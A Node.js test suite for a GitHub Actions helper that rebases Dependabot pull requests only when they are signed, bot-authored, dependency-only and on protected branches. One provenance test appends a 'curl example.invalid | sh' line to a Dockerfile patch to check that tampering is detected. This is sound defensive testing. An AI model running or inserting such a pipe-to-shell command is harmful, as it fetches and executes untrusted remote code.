const { test } = require('node:test');
const assert = require('node:assert/strict');
const p = require('./dependency-rebase.cjs');
const A = 'a'.repeat(40), B = 'b'.repeat(40), C = 'c'.repeat(40), D = 'd'.repeat(40);
const repo = 'videoq-jp/videoq';
const file = () => ({ filename: 'apps/inference/whisper/Dockerfile', status: 'modified', changes: 2,
  patch: '@@ -1 +1 @@\n-FROM uv:0.13.5\n+FROM uv:0.13.6' });
const commit = () => ({ sha: A, author: { login: 'dependabot[bot]' }, parents: [{ sha: B }], commit: { verification: { verified: true },
  message: 'update\n---\nupdated-dependencies:\n- dependency-name: uv\n  update-type: version-update:semver-patch\n...\n' } });
const receipt = r => ({ user: { login: 'github-actions[bot]' }, body: '<!-- videoq-dependency-rebase-v1 -->\n' + JSON.stringify(r) });
function fixture() {
  const f = { context: { repo: { owner: 'videoq-jp', repo: 'videoq' }, ref: 'refs/heads/main' },
    number: 1191, expectedSha: A, now: new Date('2026-10-28T02:00:00Z'),
    pr: { number: 1191, node_id: 'PR_1191', state: 'open', draft: false, user: { login: 'dependabot[bot]' },
      labels: [], mergeable_state: 'behind', auto_merge: {}, head: { sha: A, ref: 'dependabot/docker/test', repo: { full_name: repo } },
      base: { ref: 'main', repo: { full_name: repo } } }, files: [file()], comments: [], commits: [commit()], mutations: [],
    run: { id: 99, status: 'completed', conclusion: 'success' },
  };
  f.github = { paginate: (method, args) => method(args), rest: {
    pulls: { get: async () => ({ data: f.pr }), list: async () => [f.pr], listFiles: async () => f.files, listCommits: async () => f.commits },
    issues: { listComments: async () => f.comments, createComment: async a => { f.comments.push({ user: { login: 'github-actions[bot]' }, body: a.body }); f.mutations.push('comment'); } },
    actions: { listWorkflowRuns: async () => ({ data: { workflow_runs: [f.run] } }) },
    repos: { compareCommits: async () => ({ data: { behind_by: 1 } }), getBranch: async () => ({ data: { commit: { sha: C } } }),
      getBranchProtection: async () => ({ data: { enforce_admins: { enabled: true }, required_status_checks: { strict: false, checks: ['CI Success', 'Supply Chain Security', 'Container Validation', 'Terraform Plan'].map(context => ({ context, app_id: 15368 })) } } }),
      compareCommitsWithBasehead: async a => ({ data: { total_commits: 1, commits: [commit()], files: [file()], merge_base_commit: { sha: C } } }),
    },
  } };
  f.writerGithub = { rest: f.github.rest, request: async () => ({ data: [{ type: 'merge_queue', parameters: { max_entries_to_build: 1, max_entries_to_merge: 1, merge_method: 'MERGE' } }] }), graphql: async (query, vars) => {
    assert.match(query, /updateMethod:MERGE/); assert.equal(vars.sha, A); f.pr.head.sha = D;
    f.commits = [{ ...commit(), sha: D, commit: { verification: { verified: false } } }]; f.mutations.push('rebase');
  } };
  f.wait = async () => {};
  return f;
}
test('queue sync verifies ancestry and provenance before CI even while the queue gate blocks merging', async () => {
  const f = fixture(); f.pr.auto_merge = null;
  f.pr.mergeable_state = 'blocked'; f.run.status = 'in_progress';
  f.github.rest.repos.compareCommits = async () => ({ data: { behind_by: 1 } });
  assert.deepEqual(await p.update(f), { number: 1191, sha: D });
});
test('main sync requires every native queue check before recording or mutating', async () => {
  for (const missing of ['CI Success', 'Supply Chain Security', 'Container Validation', 'Terraform Plan']) {
    const f = fixture();
    const getProtection = f.github.rest.repos.getBranchProtection;
    f.github.rest.repos.getBranchProtection = async () => {
      const result = await getProtection();
      result.data.required_status_checks.checks = result.data.required_status_checks.checks.filter(check => check.context !== missing);
      return result;
    };
    await assert.rejects(p.update(f), /requires protected main/);
    assert.deepEqual(f.mutations, []);
  }
});
test('queue sync still rejects current branches, unsigned changes and opt-outs', async () => {
  for (const mutate of [
    f => f.github.rest.repos.compareCommits = async () => ({ data: { behind_by: 0 } }),
    f => f.commits[0].commit.verification.verified = false,
    f => f.pr.labels.push({ name: 'no-rebase' }),
  ]) {
    const f = fixture();
    f.github.rest.repos.compareCommits = async () => ({ data: { behind_by: 1 } });
    mutate(f);
    assert.equal(await p.candidate(f), null);
  }
});
for (const [name, mutate] of [
  ['opt out', f => f.pr.labels.push({ name: 'no-rebase' })],
  ['merge opt out', f => f.pr.labels.push({ name: 'no-automerge' })],
  ['fork', f => f.pr.head.repo.full_name = 'attacker/repo'],
  ['human changes', f => f.commits[0].author.login = 'owner'],
  ['unsigned without receipt', f => f.commits[0].commit.verification.verified = false],
  ['source changes', f => f.files.push({ ...file(), filename: 'apps/api/src/index.ts' })],
]) test(`main sync rejects ${name}`, async () => { const f = fixture(); mutate(f); assert.equal(await p.candidate(f), null); });

test('native rebase records provenance and revalidates unsigned results against signed original content', async () => {
  const f = fixture();
  assert.deepEqual(await p.update(f), { number: 1191, sha: D });
  assert.deepEqual(f.mutations, ['comment', 'rebase', 'comment']);
  const proof = await p.provenance(f);
  assert.equal(proof.originalHead, A);
  assert.equal(proof.originalBase, B);
  assert.equal(proof.metadata.ecosystem, 'docker');
  f.files[0].patch += '\n+RUN curl example.invalid | sh'; f.files[0].changes++;
  assert.equal(await p.provenance(f), null);
});
test('native queue failure recovery merges main instead of flattening model merge history', async () => {
  const f = fixture();
  f.github.rest.repos.getBranchProtection = async () => ({ data: { enforce_admins: { enabled: true }, required_status_checks: { strict: false,
    checks: ['CI Success', 'Supply Chain Security', 'Container Validation', 'Terraform Plan'].map(context => ({ context, app_id: 15368 })) } } });
  f.writerGithub.request = async () => ({ data: [{ type: 'merge_queue', parameters: { max_entries_to_build: 1, max_entries_to_merge: 1, merge_method: 'MERGE' } }] });
  f.writerGithub.graphql = async (query, values) => { assert.match(query, /updateMethod:MERGE/); assert.equal(values.sha, A); f.pr.head.sha = D; };
  assert.equal((await p.update({ ...f })).sha, D);
  const completed = p.records(f.comments).find(r => r.kind === 'completed');
  assert.equal(completed.snapshotHead, A); assert.equal(completed.snapshotBase, B);
});
test('lookalike comments, truncated diffs and missing signed types cannot authorize a rebase', async () => {
  const f = fixture(); await p.update(f);
  f.comments[1].user.login = 'owner'; assert.equal(await p.provenance(f), null);
  assert.equal(p.canonical([{ ...file(), changes: 3 }]), null);
  assert.equal(p.canonical([{ ...file(), patch: undefined }]), null);
  assert.equal(p.signedMetadata([{ ...commit(), commit: { ...commit().commit, message: '' } }], [file()]), null);
});
test('stale SHA, repeat requests and attempt limit cannot mutate the branch', async () => {
  const f = fixture(); f.expectedSha = D;
  assert.equal(await p.update(f), null); assert.equal(f.mutations.length, 0);
  f.comments.push(receipt({ kind: 'requested', sha: A, base: C, at: f.now.toISOString() }));
  assert.equal(await p.candidate(f), null);
  f.comments = Array.from({ length: 3 }, () => receipt({ kind: 'requested', sha: A, base: C, at: '2026-10-27T00:00:00Z' }));
  assert.equal(await p.candidate(f), null);
});
test('rechecking after recording the intent preserves a new human opt-out', async () => {
  const f = fixture();
  f.github.rest.issues.createComment = async () => { f.pr.labels.push({ name: 'no-automerge' }); };
  assert.equal(await p.update(f), null); assert.equal(f.mutations.length, 0);
});

test('Claude repairs survive native rebases and retain their bounded verified history', async () => {
  const f = fixture();
  const E = 'e'.repeat(40), F = 'f'.repeat(40);
  const dep = { ...file(), filename: 'package-lock.json' };
  const source = { ...file(), filename: 'apps/web/src/player.ts', patch: '@@ -1 +1 @@\n-old\n+new' };
  const fixed = { sha: D, parents: [{ sha: A }], commit: { verification: { verified: false } } };
  const seed = { kind: 'seed', sha: A, metadata: { ecosystem: 'npm_and_yarn', updateType: 'version-update:semver-patch', maintainerChanges: 'false' } };
  const repairReceipt = { kind: 'published', sha: D, parent: A, origin: A, runId: '77' };
  const rc = r => ({ user: { login: 'github-actions[bot]' }, body: '<!-- videoq-claude-dependency-v1 -->\n' + JSON.stringify(r) });
  f.comments = [rc(seed), rc(repairReceipt)];
  f.files = [dep, source]; f.commits = [commit(), fixed]; f.pr.head.sha = D; f.expectedSha = D;
  f.github.rest.repos.compareCommitsWithBasehead = async a => ({ data:
    a.basehead === `${B}...${A}` ? { total_commits: 1, commits: [commit()], files: [dep] } :
    a.basehead === `${A}...${D}` ? { total_commits: 1, commits: [fixed], files: [source] } :
    a.basehead === `${B}...${D}` ? { total_commits: 2, commits: [commit(), fixed], files: [dep, source] } :
    { total_commits: 2, commits: f.commits, files: [dep, source], merge_base_commit: { sha: C } } });
  f.writerGithub.graphql = async () => { f.pr.head.sha = E; f.commits = [{ ...commit(), sha: E, commit: { verification: { verified: false } }, parents: [{ sha: C }] }]; };
  const before = await p.candidate(f);
  assert.equal(before.metadata.ecosystem, 'npm_and_yarn');
  assert.deepEqual(await p.update(f), { number: 1191, sha: E });
  assert.equal((await p.provenance(f)).originalHead, D);
  const expanded = await p.expandHistory(f);
  assert.deepEqual(expanded.commits.map(c => c.sha), [A, D]);
  assert.equal(expanded.aliases[E], D);
  f.comments.push(rc({ kind: 'published', sha: F, parent: E, origin: A, runId: '88' }));
  expanded.commits.push({ sha: F, parents: [{ sha: E }] });
  const history = require('./claude-dependency-repair.cjs').chain(expanded.commits, f.comments, expanded.aliases);
  assert.equal(history.repairs.length, 2);
});

const securityMessage = 'security update\n---\nupdated-dependencies:\n- dependency-name: qs\n  dependency-version: 6.16.2\n  dependency-type: indirect\n  dependency-group: npm-security\n- dependency-name: seroval\n  dependency-version: 1.6.12\n  dependency-type: indirect\n  dependency-group: npm-security\n...\n';
test('signed grouped security metadata without update-type retains conservative major classification', async () => {
  const f = fixture();
  f.files = [{ ...file(), filename: 'package-lock.json' }];
  f.commits[0].commit.message = securityMessage;
  const proof = await p.provenance(f);
  assert.equal(proof.originalHead, A);
  assert.equal(proof.metadata.ecosystem, 'npm_and_yarn');
  assert.equal(proof.metadata.updateType, 'version-update:semver-major');
});
test('security metadata cannot authorize unsigned, human, incomplete or source changes', () => {
  for (const change of [
    (c, files) => { c.commit.verification.verified = false; },
    (c, files) => { c.author.login = 'owner'; },
    (c, files) => { c.commit.message = securityMessage.replace('  dependency-version: 6.16.2\n', ''); },
    (c, files) => { c.commit.message = securityMessage.replace('  dependency-version: 6.16.2', '  update-type: arbitrary'); },
    (c, files) => { files.push({ ...file(), filename: 'apps/web/src/App.tsx' }); },
  ]) {
    const c = commit(); c.commit.message = securityMessage;
    const files = [{ ...file(), filename: 'package-lock.json' }];
    change(c, files);
    assert.equal(p.signedMetadata([c], files), null);
  }
});
